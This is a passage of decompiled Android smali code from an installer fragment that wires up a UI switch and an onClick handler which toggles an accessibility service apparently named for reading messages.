    invoke-virtual {v0, p3}, Landroid/widget/Switch;->setOnCheckedChangeListener(Landroid/widget/CompoundButton$OnCheckedChangeListener;)V

    return-object p1

    :cond_2
    new-instance p1, Ljava/lang/NullPointerException;

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "Switch was not found. id="

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-direct {p1, p2}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onClick(Landroid/view/View;)V
    .locals 1

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->L1()Z

    move-result p1

    if-eqz p1, :cond_0

    iget-object p1, p0, Lhw/installer/FragmentInstallAccessibilityService;->d0:Ljava/lang/Boolean;

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-nez p1, :cond_0

    invoke-direct {p0}, Lhw/installer/FragmentInstallAccessibilityService;->O1()V

    goto :goto_0

    :cond_0
    invoke-static {}, Lhw/imreader/ReaderAccessibilityService;->k()V

    iget-object p1, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Lhw/installer/b;->h0(Z)V

    iget-object p1, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    invoke-virtual {p1}, Lhw/installer/b;->W()V

    :goto_0
    return-void
.end method

.method s1()V
    .locals 2

    iget-object v0, p0, Lhw/installer/FragmentInstallAccessibilityService;->Z:Lhw/installer/b;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lhw/installer/b;->h0(Z)V

    invoke-static {}, Lhw/imreader/ReaderAccessibilityService;->k()V

    return-void
.end method

.method public z0()V
    .locals 0

    invoke-super {p0}, Lb/j/a/d;->z0()V

    return-void
.end method
